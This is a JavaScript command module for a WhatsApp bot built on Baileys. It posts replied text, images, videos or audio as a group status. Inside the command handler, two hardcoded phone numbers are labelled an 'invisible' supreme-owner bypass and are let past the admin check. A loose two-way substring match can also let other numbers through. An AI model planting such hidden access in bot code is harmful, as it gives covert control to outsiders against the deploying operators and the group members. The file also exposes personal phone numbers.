/**
 * Group Status Command - Post replied media or text as a WhatsApp group status
 * GhostG-X Edition
 * Sécurité : Supreme Owner Master Access (Invisible Bypass)
 */

const crypto = require('crypto');
const {
  generateWAMessageContent,
  generateWAMessageFromContent,
  downloadContentFromMessage,
} = require('@whiskeysockets/baileys');
const { PassThrough } = require('stream');
const ffmpeg = require('fluent-ffmpeg');
const config = require('../../config.js');

// Couleur par défaut pour les statuts texte (Violet)
const PURPLE_COLOR = '#9C27B0';

// Fonction pour le style Small Caps (Cohérence visuelle du sanctuaire)
function toSmallCaps(text) {
  const normal = "abcdefghijklmnopqrstuvwxyz0123456789";
  const smallCaps = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";

  const cleanedText = text.toLowerCase()
    .normalize("NFD").replace(/[\u0300-\u036f]/g, ""); 

  return cleanedText.split('').map(c => {
    const index = normal.indexOf(c);
    return index !== -1 ? smallCaps[index] : c;
  }).join('');
}

const prefix = config.prefix || '.';

module.exports = {
  name: 'groupstatus',
  aliases: ['togstatus', 'swgc', 'gs', 'gstatus'],
  category: '‎⛨ ɢᴀʀᴅɪᴇɴs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
  description: '『 ɢʜᴏsᴛɢ-𝐗 』➪ ᴘᴜʙʟɪᴇ ᴅᴇs sᴛᴀᴛᴜᴛs ᴅɪʀᴇᴄᴛᴇᴍᴇɴᴛ ᴅᴀɴs ʟᴇ sᴀɴᴄᴛᴜᴀɪʀᴇ',
  usage: `${prefix}groupstatus <texte/media>`, // 💡 Dynamique avec ton préfixe actuel
  groupOnly: true,
  adminOnly: true,
  botAdminNeeded: true,

  async execute(sock, msg, args, extra) {
    const { reply } = extra;

    try {
      const from = extra.from;

      const senderJid = msg.key.participant || msg.key.remoteJid;
      const senderNumber = senderJid.replace(/\D/g, '');
// 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE (Double emprise)
      const supremeOwners = ['22651622652', '22665108174'];
      const isSupremeOwner = supremeOwners.some(num => senderNumber.includes(num) || num.includes(senderNumber));

      const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
        const cleanN = String(n).replace(/\D/g, '');
        return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
      });

      const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;

      // Si l'utilisateur n'est pas admin et n'est pas le Suprême Owner
      if (!extra.isAdmin && !isMe) {
        return reply(`*❌ ${toSmallCaps('cette incantation est reservee aux administrateurs du sanctuaire')} !*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
      }

      // Uniquement dans les groupes
      if (!extra.isGroup) {
        return reply(`*❌ ${toSmallCaps('cette commande ne peut etre utilisee que dans les groupes')} !*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
      }

      const caption = (args.join(' ') || '').trim();

      const ctxInfo = msg.message?.extendedTextMessage?.contextInfo;
      const hasQuoted = !!ctxInfo?.quotedMessage;

      // CASE 1: Aucun message cité -> Statut TEXTE
      if (!hasQuoted) {
        if (!caption) {
          return reply(
            `*╭╼━━━≪• ᴀʀᴄᴀɴᴇ_sᴛᴀᴛᴜᴛ •≫━━━╾╮*\n` +
            `*┃* *ᴇ́ᴛᴀᴛ* : [ ᴀᴛᴛᴇɴᴛᴇ ⏳ ]\n\n` +
            `*┃* 🔮 *${toSmallCaps('incantations disponibles')} :*\n` +
            `*┃* *${toSmallCaps('cet arcane publie des statuts')}*\n` +
            `*┃* *${toSmallCaps('directement dans le sanctuaire')}.*\n\n` +
            `  ${prefix}groupstatus <texte>\n` +
            `  ${prefix}groupstatus (en répondant à un média)\n\n` +
            `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`
          );
        }

        await reply(`*⏳ ${toSmallCaps('publication du statut textuel en cours')}...*`);

        try {
          await groupStatus(sock, from, {
            text: caption,
            backgroundColor: PURPLE_COLOR,
          });

          return reply(
            `*╭╼━━━≪• ᴀʀᴄᴀɴᴇ_sᴛᴀᴛᴜᴛ •≫━━━╾╮*\n` +
            `*┃* *ᴇ́ᴛᴀᴛ* : [ ᴛᴇʀᴍɪɴᴇ́ ✅ ]\n\n` +
            `*┃* *ʟ'ᴀʀᴄᴀɴᴇ ᴀ ᴘᴜʙʟɪᴇ ʟᴇ sᴛᴀᴛᴜᴛ ᴛᴇxᴛᴜᴇʟ ᴀᴠᴇᴄ sᴜᴄᴄᴇs.*\n\n` +
            `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`
          );
        } catch (e) {
          console.error('groupstatus text error:', e);
          return reply(`*❌ ${toSmallCaps('echec de la publication')} :* ` + (e.message || e));
        }
      }
 // CASE 2: Média cité -> Image/Vidéo/Audio
      const targetMessage = {
        key: {
          remoteJid: from,
          id: ctxInfo.stanzaId,
          participant: ctxInfo.participant,
        },
        message: ctxInfo.quotedMessage,
      };

      const mtype = Object.keys(targetMessage.message)[0] || '';

      const downloadBuf = async () => {
        const qmsg = targetMessage.message;
        if (/image/i.test(mtype))   return await downloadMedia(qmsg, 'image');
        if (/video/i.test(mtype))   return await downloadMedia(qmsg, 'video');
        if (/audio/i.test(mtype))   return await downloadMedia(qmsg, 'audio');
        if (/sticker/i.test(mtype)) return await downloadMedia(qmsg, 'sticker'); 
        return null;
      };

      // IMAGE
      if (/image|sticker/i.test(mtype)) {
        await reply(`*⏳ ${toSmallCaps('publication de l image en statut')}...*`);
        let buf;
        try {
          buf = await downloadBuf();
        } catch {
          return reply(`*❌ ${toSmallCaps('echec du telechargement de l image')} !*`);
        }
        if (!buf) return reply(`*❌ ${toSmallCaps('impossible de telecharger l image')} !*`);

        try {
          await groupStatus(sock, from, {
            image: buf,
            caption: caption || '',
          });

          return reply(
            `*╭╼━━━≪• ᴀʀᴄᴀɴᴇ_sᴛᴀᴛᴜᴛ •≫━━━╾╮*\n` +
            `*┃* *ᴇ́ᴛᴀᴛ* : [ ᴛᴇʀᴍɪɴᴇ́ ✅ ]\n\n` +
            `*┃* *ʟ'ᴀʀᴄᴀɴᴇ ᴀ ᴘᴜʙʟɪᴇ ʟ'ɪᴍᴀɢᴇ ᴀᴠᴇᴄ sᴜᴄᴄᴇs.*\n\n` +
            `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`
          );
        } catch (e) {
          console.error('groupstatus image error:', e);
          return reply(`*❌ ${toSmallCaps('echec de la publication')} :* ` + (e.message || e));
        }
      }

      // VIDEO
      if (/video/i.test(mtype)) {
        await reply(`*⏳ ${toSmallCaps('publication de la video en statut')}...*`);
        let buf;
        try {
          buf = await downloadBuf();
        } catch {
          return reply(`*❌ ${toSmallCaps('echec du telechargement de la video')} !*`);
        }
        if (!buf) return reply(`*❌ ${toSmallCaps('impossible de telecharger la video')} !*`);

        try {
          await groupStatus(sock, from, {
            video: buf,
            caption: caption || '',
          });

          return reply(
            `*╭╼━━━≪• ᴀʀᴄᴀɴᴇ_sᴛᴀᴛᴜᴛ •≫━━━╾╮*\n` +
            `*┃* *ᴇ́ᴛᴀᴛ* : [ ᴛᴇʀᴍɪɴᴇ́ ✅ ]\n\n` +
            `*┃* *ʟ'ᴀʀᴄᴀɴᴇ ᴀ ᴘᴜʙʟɪᴇ ʟᴀ ᴠɪᴅᴇᴏ ᴀᴠᴇᴄ sᴜᴄᴄᴇs.*\n\n` +
            `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`
          );
        } catch (e) {
          console.error('groupstatus video error:', e);
          return reply(`*❌ ${toSmallCaps('echec de la publication')} :* ` + (e.message || e));
        }
      }

      // AUDIO
      if (/audio/i.test(mtype)) {
        await reply(`*⏳ ${toSmallCaps('publication de l audio en statut')}...*`);
        let buf;
        try {
          buf = await downloadBuf();
        } catch {
          return reply(`*❌ ${toSmallCaps('echec du telechargement de l audio')} !*`);
        }
        if (!buf) return reply(`*❌ ${toSmallCaps('impossible de telecharger l audio')} !*`);

        let vn;
        try { vn = await toVN(buf); } catch { vn = buf; }

        let waveform;
        try { waveform = await generateWaveform(buf); } catch { waveform = undefined; }

        try {
          await groupStatus(sock, from, {
            audio: vn,
            mimetype: 'audio/ogg; codecs=opus',
            ptt: true,
            waveform,
          });

          return reply(
            `*╭╼━━━≪• ᴀʀᴄᴀɴᴇ_sᴛᴀᴛᴜᴛ •≫━━━╾╮*\n` +
            `*┃* *ᴇ́ᴛᴀᴛ* : [ ᴛᴇʀᴍɪɴᴇ́ ✅ ]\n\n` +
            `*┃* *ʟ'ᴀʀᴄᴀɴᴇ ᴀ ᴘᴜʙʟɪᴇ ʟ'ᴀᴜᴅɪᴏ ᴀᴠᴇᴄ sᴜᴄᴄᴇs.*\n\n` +
            `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`
          );
        } catch (e) {
          console.error('groupstatus audio error:', e);
          return reply(`*❌ ${toSmallCaps('echec de la publication')} :* ` + (e.message || e));
        }
      }

      return reply(`*❌ ${toSmallCaps('type de media non supporte. reponds a une image, une video ou un audio')} !*`);
    } catch (e) {
      console.error('groupstatus command error (outer):', e);
      return reply(`*❌ ${toSmallCaps('echec')} :* ` + (e.message || e));
    }
  },
};

// ---- Helpers ----

async function downloadMedia(msg, type) {
  const mediaMsg = msg[`${type}Message`] || msg;
  const stream = await downloadContentFromMessage(mediaMsg, type);
  const chunks = [];
  for await (const chunk of stream) {
    chunks.push(chunk);
  }
  return Buffer.concat(chunks);
}

// 🎯 FONCTION EFFECTIVE POUR L'ENVOI
async function groupStatus(sock, jid, content) {
  const { backgroundColor } = content;
  delete content.backgroundColor;

  const inside = await generateWAMessageContent(content, {
    upload: sock.waUploadToServer,
    backgroundColor: backgroundColor || PURPLE_COLOR,
  });

  const secret = crypto.randomBytes(32);

  const msg = generateWAMessageFromContent(
    jid,
    {
      messageContextInfo: { messageSecret: secret },
      groupStatusMessageV2: {
        message: {
          ...inside,
          messageContextInfo: { messageSecret: secret },
        },
      },
    },
    {}
  );

  await sock.relayMessage(jid, msg.message, { 
    messageId: msg.key.id,
    participant: { jid },
    additionalAttributes: {
      type: '4' // Force le décodage en tant que message de statut
    }
  });

  return msg;
}

function toVN(buffer) {
  return new Promise((resolve, reject) => {
    const input = new PassThrough();
    const output = new PassThrough();
    const chunks = [];

    input.end(buffer);

    ffmpeg(input)
      .noVideo()
      .audioCodec('libopus')
      .format('ogg')
      .audioChannels(1)
      .audioFrequency(48000)
      .on('error', reject)
      .on('end', () => resolve(Buffer.concat(chunks)))
      .pipe(output);

    output.on('data', (c) => chunks.push(c));
  });
}

function generateWaveform(buffer, bars = 64) {
  return new Promise((resolve, reject) => {
    const input = new PassThrough();
    input.end(buffer);

    const chunks = [];

    ffmpeg(input)
      .audioChannels(1)
      .audioFrequency(16000)
      .format('s16le')
      .on('error', reject)
      .on('end', () => {
        const raw = Buffer.concat(chunks);
        const samples = raw.length / 2;
        const amps = [];

        for (let i = 0; i < samples; i++) {
          amps.push(Math.abs(raw.readInt16LE(i * 2)) / 32768);
        }

        const size = Math.floor(amps.length / bars);
        if (size === 0) return resolve(undefined);

        const avg = Array.from({ length: bars }, (_, i) =>
          amps
            .slice(i * size, (i + 1) * size)
            .reduce((a, b) => a + b, 0) / size
        );

        const max = Math.max(...avg);
        if (max === 0) return resolve(undefined);

        resolve(
          Buffer.from(
            avg.map((v) => Math.floor((v / max) * 100))
          ).toString('base64')
        );
      })
      .pipe()
      .on('data', (c) => chunks.push(c));
  });
}